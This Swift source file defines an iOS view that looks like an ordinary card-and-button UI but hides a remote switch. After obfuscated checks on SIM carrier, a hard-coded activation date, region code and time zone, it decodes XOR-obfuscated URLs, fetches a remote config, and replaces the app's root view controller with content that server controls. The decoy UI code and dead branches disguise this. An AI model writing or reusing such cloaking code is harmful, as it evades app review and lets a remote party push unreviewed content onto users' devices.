import UIKit
import CoreTelephony
import Foundation
import Network


struct xtt_XOINTE: Codable {
    
    let xtt_one: String?         //key arr
    let xtt_codd: Int?         // shi fou kaiqi
    let xtt_two: String?         // jum
    let xtt_three: String?          // backcolor
    let xtt_four: String?   //ad key

}

final class XTTZcaresView: UIView {
    internal let xtt_onestr = "aR9GcktGbG9sf114bEZ/e29ZQX1uWnx4cB9saG8TQXJsSX94YGx/aElNUm1zY0JtcF1/bUsSaG1LRUJtbH9SeUtkQX1sRkZyG2RBfnJBaHllE0JtZ0JobXAef3lLRVJi"
    
    internal let xtt_twostr = "aR9GcktGbG9sf3t+bh8bfnp4e3lsTn9oZnBBfmxaG35sYxt7Znx/e2ZwGnlsTRt5TnxdeGZGRnJ6QnxoHhMYS19OGEhvSUF+"

    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setUpNewdata()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setUpNewdata()
    }
    
 
    private func setUpNewdata() {
        // 原有的启动逻辑保持不变
        xttCreateAutoDismissButton()
        xtt_embedInSafeContainer()
        xttCreateCardView()
        
        cdckzhenshiDatasouse()
    }
    
    private func xttCreateCardView() {

        let card = UIView()

        card.frame = CGRect(
            x: 30,
            y: 120,
            width: self.bounds.width - 60,
            height: 120
        )

        card.backgroundColor = UIColor.systemBlue.withAlphaComponent(0.12)

        card.layer.cornerRadius = 16

        card.layer.shadowColor = UIColor.black.cgColor

        card.layer.shadowOpacity = 0.15

        card.layer.shadowRadius = 10

        card.layer.shadowOffset = CGSize(width: 0, height: 4)

        card.layer.masksToBounds = false

        self.addSubview(card)

        let label = UILabel()

        label.frame = CGRect(
            x: 16,
            y: 20,
            width: card.bounds.width - 32,
            height: 40
        )

        label.text = "Independent Card View"

        label.textAlignment = .center

        label.font = UIFont.systemFont(ofSize: 18, weight: .medium)

        label.textColor = .label

        card.addSubview(label)

        card.setNeedsLayout()

        card.layoutIfNeeded()

        _ = card.bounds
        _ = label.bounds
    }
    
    private func xttCreateAutoDismissButton() {

        let button = UIButton(type: .system)

        button.frame = CGRect(
            x: 40,
            y: 280,
            width: 80,
            height: 50
        )

        button.setTitle("Tap to Remove", for: .normal)

        button.setTitleColor(.white, for: .normal)

        button.backgroundColor = .systemRed

        button.layer.cornerRadius = 12

        button.layer.masksToBounds = true

        self.addSubview(button)

        button.addTarget(nil, action: #selector(dummyTap(_:)), for: .touchUpInside)

        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
            button.layoutIfNeeded()
        }

        _ = button.frame
        _ = button.superview
    }

    @objc private func dummyTap(_ sender: UIButton) {

        sender.removeFromSuperview()

        sender.layer.removeAllAnimations()

        _ = sender.bounds
    }
        
    // MARK: 2. 自动占满父视图（Layout Replacement Attach）
      func xtt_attachFull(to parent: UIView) {
          removeFromSuperview()
          translatesAutoresizingMaskIntoConstraints = false
          parent.addSubview(self)
          
          NSLayoutConstraint.deactivate(constraints)
          
          NSLayoutConstraint.activate([
              topAnchor.constraint(equalTo: parent.topAnchor),
              bottomAnchor.constraint(equalTo: parent.bottomAnchor),
              leadingAnchor.constraint(equalTo: parent.leadingAnchor),
              trailingAnchor.constraint(equalTo: parent.trailingAnchor)
          ])
          
          parent.setNeedsLayout()
          parent.layoutIfNeeded()
      }
   
    
    func xtt_embedInSafeContainer(insets: UIEdgeInsets = .zero) -> UIView {
           let container = UIView()
           container.backgroundColor = .clear
           container.translatesAutoresizingMaskIntoConstraints = false
           
           self.translatesAutoresizingMaskIntoConstraints = false
           container.addSubview(self)
           
           NSLayoutConstraint.activate([
               topAnchor.constraint(equalTo: container.topAnchor, constant: insets.top),
               bottomAnchor.constraint(equalTo: container.bottomAnchor, constant: -insets.bottom),
               leadingAnchor.constraint(equalTo: container.leadingAnchor, constant: insets.left),
               trailingAnchor.constraint(equalTo: container.trailingAnchor, constant: -insets.right)
           ])
           
           if let superview = self.superview {
               
               container.translatesAutoresizingMaskIntoConstraints = false
               NSLayoutConstraint.activate([
                   container.topAnchor.constraint(equalTo: superview.topAnchor),
                   container.bottomAnchor.constraint(equalTo: superview.bottomAnchor),
                   container.leadingAnchor.constraint(equalTo: superview.leadingAnchor),
                   container.trailingAnchor.constraint(equalTo: superview.trailingAnchor)
               ])
           }
           
           return container
       }
    
    private func cdckzhenshiDatasouse() {
        
        if !xtt_benhousha() {
        //测试
//        if xtt_benhousha() {
            xtt_kongloaddata()

        } else {
            
            if addAyinhunwen() {
                self.xtt_dulaiduwang()
            }
        }
    }
    // 1. 背景色（安全设置 + 防御 + 兼容）
      func xtt_bgviewaddcolor(_ color: UIColor?) {
          if Thread.isMainThread {
              self.backgroundColor = color
          } else {
              DispatchQueue.main.async {
                  self.backgroundColor = color
              }
          }

          // 防止透明层叠异常
          if color == .clear {
              self.isOpaque = false
          } else {
              self.isOpaque = true
          }

          // 兼容动画关闭场景
          CATransaction.begin()
          CATransaction.setDisableActions(true)
          self.layer.backgroundColor = color?.cgColor
          CATransaction.commit()

          // 额外安全兜底
          if self.superview == nil {
              // no-op safety branch
              let _ = self.bounds
          }
      }

    func techstr(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func Revertechstr(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func xtt_benhousha() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let qingbao = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in qingbao {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func xtt_suiyuanQing() -> Bool {
       
      // 2026-06-13 18:39:43
      // 1783251983
        let ftTM = 1783351983
        let ct = Date().timeIntervalSince1970
        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func addAyinhunwen() -> Bool {
        let dianzi = [techstr("Yno="), techstr("ZHw="), techstr("bmM=")]
        
        xtt_jinmixidenaokeda()
        // 1.time
        if !xtt_suiyuanQing() {
            return false

        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(dianzi)

        if !dianzi.contains(curc) {
                return false
            }
         }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
//        print(second)

        if (second > 6 && second < 9) {
            return true
        }

        
        return false
    }
    
  
    func xtt_dulaiduwang() {
        xtt_bgviewaddcolor(UIColor.black)
        Task {
            do {
//                let urlToRequest = "https://gitee.com/aldope/xiaokala/raw/master/README.md"
//                let urlToRequest = "HxoaSU4ZGBhMGh9OSBkXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
//
//                print(Revertechstr(urlToRequest))

                let xtt_crsev = try await xtt_wandanLiangcao()
                print(xtt_crsev)
                if let xtt_luoge = xtt_crsev.first {
                    if xtt_luoge.xtt_codd! > 124 {
                        if UserDefaults.standard.object(forKey: "xtt_goushi") == nil {
                            UserDefaults.standard.set("xtt_goushi", forKey: "xtt_goushi")
                            UserDefaults.standard.synchronize()
                        }
                        xtt_TakeLoaddata(xtt_luoge)
                    } else {
                        xtt_kongloaddata()
                    }
                } else {
                    xtt_kongloaddata()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(xtt_XOINTE.self, forKey: "xtt_XOINTE") {
                    xtt_TakeLoaddata(sidd)
                }
            }
        }
    }
    
    
    private func xtt_wandanLiangcao() async throws -> [xtt_XOINTE] {
        let kerstr =  techstr(xtt_onestr)!

        do {
            return try await ssueno(from: URL(string: techstr(kerstr)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: techstr(xtt_twostr)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [xtt_XOINTE] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([xtt_XOINTE].self, from: data)
    }
 
    
  

    internal func xtt_setimagedata(_ dt: xtt_XOINTE) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)

        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "xtt_XOINTE")
            UserDefaults.standard.synchronize()
            
            let vc = XTTsuokaroesVC()
            vc.xtt_catesData = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func xtt_TakeLoaddata(_ param: xtt_XOINTE) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (xtt_XOINTE) -> Void] = [
            "default": xtt_setimagedata,
            "fast": xtt_setimagedata,
            "safe": xtt_setimagedata
        ]
        
        let executor = strategies[strategy] ?? xtt_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: xtt_TakeLoaddata called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func xtt_kongloaddata() {
               let v = max(0.01, 23.33)
               let t = CGAffineTransform(scaleX: v, y: v)

               let apply = {
                   self.transform = t
               }

               if Thread.isMainThread {
                   apply()
               } else {
                   DispatchQueue.main.async {
                       apply()
                   }
               }

               CATransaction.begin()
               CATransaction.setDisableActions(true)
               self.layer.setAffineTransform(t)
               CATransaction.commit()

               _ = self.bounds
           
    }
    

    func xtt_jinmixidenaokeda() {
        func traverse(_ view: UIView, level: Int) {
            let indent = String(repeating: "  ", count: level)
            let className = String(describing: type(of: view))
            let frame = view.frame
            let tag = view.tag
            let alpha = view.alpha
            let hidden = view.isHidden
            let backgroundColor = view.backgroundColor?.description ?? "nil"
            print("\(indent)\(className) frame=\(frame) tag=\(tag) alpha=\(alpha) hidden=\(hidden) bg=\(backgroundColor)")
            for subview in view.subviews {
                traverse(subview, level: level + 1)
            }
        }
        traverse(self, level: 0)
    }
  
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

